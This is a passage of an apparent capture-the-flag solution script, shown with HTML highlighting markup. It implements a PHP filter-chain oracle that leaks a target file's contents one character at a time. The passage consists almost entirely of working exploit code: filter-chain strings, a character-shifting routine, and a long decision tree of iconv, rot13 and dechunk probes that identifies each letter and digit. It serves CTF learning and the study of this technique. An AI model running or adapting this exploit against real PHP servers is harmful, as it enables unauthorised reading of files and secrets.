efabijcd0+gh3DAD0+3D3DAD==wD

And here's the cute part: not only have we now accessed the 5th and 6th chars of the string, but
the string still has two equals signs in it, so we can reapply the technique as many times as we
want, to access all the characters in the string ;)
"</span><span class="token string double-quoted-string">""</span>

flip <span class="token operator">=</span> <span class="token string double-quoted-string">"convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"</span>
r2 <span class="token operator">=</span> <span class="token string double-quoted-string">"convert.iconv.CSUNICODE.UCS-2BE"</span>
r4 <span class="token operator">=</span> <span class="token string double-quoted-string">"convert.iconv.UCS-4LE.10646-1:1993"</span>

def <span class="token function">get_nth</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">global</span> flip<span class="token punctuation">,</span> r2<span class="token punctuation">,</span> r4
	o <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
	chunk <span class="token operator">=</span> n <span class="token comment">// 2</span>
	<span class="token keyword">if</span> chunk <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> o<span class="token operator">.</span><span class="token function">append</span><span class="token punctuation">(</span>r4<span class="token punctuation">)</span>
	o<span class="token operator">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">[</span>flip<span class="token punctuation">,</span> r4<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>chunk <span class="token comment">// 2))</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>chunk <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">o</span><span class="token operator">.</span><span class="token function">append</span><span class="token punctuation">(</span>r2<span class="token punctuation">)</span>
	<span class="token keyword">return</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token operator">*</span>o<span class="token punctuation">)</span>

<span class="token string double-quoted-string">""</span><span class="token string double-quoted-string">"
Step 3:
This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
char is 0-9A-Fa-f. So it's just a matter of finding filters which translate to or from those
chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
I just bruteforced every combination of iconv filters to find these.

Numbers are a bit trickier because iconv doesn't tend to touch them.
In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
want a full leak you can base64 encode a third time and use the first two letters of the resulting
string to figure out which number it is.
"</span><span class="token string double-quoted-string">""</span>

rot1 <span class="token operator">=</span> <span class="token string single-quoted-string">'convert.iconv.437.CP930'</span>
be <span class="token operator">=</span> <span class="token string single-quoted-string">'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'</span>
o <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>

def <span class="token function">find_letter</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># a-f A-F 0-9</span>
		<span class="token keyword">if</span> not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token comment"># a-e</span>
			<span class="token keyword">for</span> n in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
				<span class="token keyword">if</span> <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|'</span> <span class="token operator">+</span> f<span class="token string single-quoted-string">'&#123;rot1&#125;|&#123;be&#125;|'</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> f<span class="token string single-quoted-string">'&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
					<span class="token keyword">return</span> <span class="token string single-quoted-string">'edcba'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>
					<span class="token keyword">break</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
		elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token comment"># A-E</span>
			<span class="token keyword">for</span> n in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
				<span class="token keyword">if</span> <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|'</span> <span class="token operator">+</span> f<span class="token string single-quoted-string">'&#123;rot1&#125;|&#123;be&#125;|'</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> f<span class="token string single-quoted-string">'&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
					<span class="token keyword">return</span> <span class="token string single-quoted-string">'EDCBA'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>
					<span class="token keyword">break</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
		elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|convert.iconv.CSISO5427CYRILLIC.855|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'*'</span>
		elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token comment"># f</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'f'</span>
		elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token comment"># F</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'F'</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># n-s N-S</span>
		<span class="token keyword">if</span> not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token comment"># n-r</span>
			<span class="token keyword">for</span> n in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
				<span class="token keyword">if</span> <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|'</span> <span class="token operator">+</span> f<span class="token string single-quoted-string">'&#123;rot1&#125;|&#123;be&#125;|'</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> f<span class="token string single-quoted-string">'&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
					<span class="token keyword">return</span> <span class="token string single-quoted-string">'rqpon'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>
					<span class="token keyword">break</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
		elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token comment"># N-R</span>
			<span class="token keyword">for</span> n in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
				<span class="token keyword">if</span> <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|string.tolower|'</span> <span class="token operator">+</span> f<span class="token string single-quoted-string">'&#123;rot1&#125;|&#123;be&#125;|'</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> f<span class="token string single-quoted-string">'&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
					<span class="token keyword">return</span> <span class="token string single-quoted-string">'RQPON'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>
					<span class="token keyword">break</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
		elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token comment"># s</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'s'</span>
		elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token comment"># S</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'S'</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># i j k</span>
		<span class="token keyword">if</span> <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'k'</span>
		elif <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'j'</span>
		elif <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'i'</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># I J K</span>
		<span class="token keyword">if</span> <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'K'</span>
		elif <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'J'</span>
		elif <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'I'</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># v w x</span>
		<span class="token keyword">if</span> <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'x'</span>
		elif <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'w'</span>
		elif <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'v'</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># V W X</span>
		<span class="token keyword">if</span> <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'X'</span>
		elif <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'W'</span>
		elif <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token string single-quoted-string">'V'</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># Z</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'Z'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># z</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'z'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># M</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'M'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># m</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'m'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># y</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'y'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># Y</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'Y'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># l</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'l'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># L</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'L'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># h</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'h'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># H</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'H'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># u</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'u'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># U</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'U'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># g</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'g'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># G</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'G'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># t</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'t'</span>
	elif not <span class="token function">req</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># T</span>
		<span class="token keyword">return</span> <span class="token string single-quoted-string">'T'</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'something wrong'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token class-name return-type">prefix</span> <span class="token operator">=</span> f<span class="token string single-quoted-string">'&#123;header&#125;|&#123;get_nth(i)&#125;'</span>
	letter <span class="token operator">=</span> <span class="token function">find_letter</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
	<span class="token comment"># it's a number! check base64</span>
	<span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">:</span>
		prefix <span class="token operator">=</span> f<span class="token string single-quoted-string">'&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode'</span>
		s <span class="token operator">=</span> <span class="token function">find_letter</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
		<span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token string single-quoted-string">'M'</span><span class="token punctuation">:</span>
			<span class="token comment"># 0 - 3</span>
			prefix <span class="token operator">=</span> f<span class="token string single-quoted-string">'&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;'</span>
			ss <span class="token operator">=</span> <span class="token function">find_letter</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
			<span class="token keyword">if</span> ss in <span class="token string single-quoted-string">'CDEFGH'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span>
			elif ss in <span class="token string single-quoted-string">'STUVWX'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span>
			elif ss in <span class="token string single-quoted-string">'ijklmn'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'2'</span>
			elif ss in <span class="token string single-quoted-string">'yz*'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'3'</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token function">err</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'bad num (&#123;ss&#125;)'</span><span class="token punctuation">)</span>
		elif s <span class="token operator">==</span> <span class="token string single-quoted-string">'N'</span><span class="token punctuation">:</span>
			<span class="token comment"># 4 - 7</span>
			prefix <span class="token operator">=</span> f<span class="token string single-quoted-string">'&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;'</span>
			ss <span class="token operator">=</span> <span class="token function">find_letter</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
			<span class="token keyword">if</span> ss in <span class="token string single-quoted-string">'CDEFGH'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'4'</span>
			elif ss in <span class="token string single-quoted-string">'STUVWX'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'5'</span>
			elif ss in <span class="token string single-quoted-string">'ijklmn'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'6'</span>
			elif ss in <span class="token string single-quoted-string">'yz*'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'7'</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token function">err</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'bad num (&#123;ss&#125;)'</span><span class="token punctuation">)</span>
		elif s <span class="token operator">==</span> <span class="token string single-quoted-string">'O'</span><span class="token punctuation">:</span>
			<span class="token comment"># 8 - 9</span>
			prefix <span class="token operator">=</span> f<span class="token string single-quoted-string">'&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;'</span>
			ss <span class="token operator">=</span> <span class="token function">find_letter</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
			<span class="token keyword">if</span> ss in <span class="token string single-quoted-string">'CDEFGH'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'8'</span>
			elif ss in <span class="token string single-quoted-string">'STUVWX'</span><span class="token punctuation">:</span>
				letter <span class="token operator">=</span> <span class="token string single-quoted-string">'9'</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token function">err</span><span class="token punctuation">(</span>f<span class="token string single-quoted-string">'bad num (&#123;ss&#125;)'</span><span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token function">err</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'wtf'</span><span class="token punctuation">)</span>

	<span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">=</span>letter<span class="token punctuation">)</span>
	o <span class="token operator">+=</span> letter
	sys<span class="token operator">.</span>stdout<span class="token operator">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token string double-quoted-string">""</span><span class="token string double-quoted-string">"
We are done!! :)
"</span><span class="token string double-quoted-string">""</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
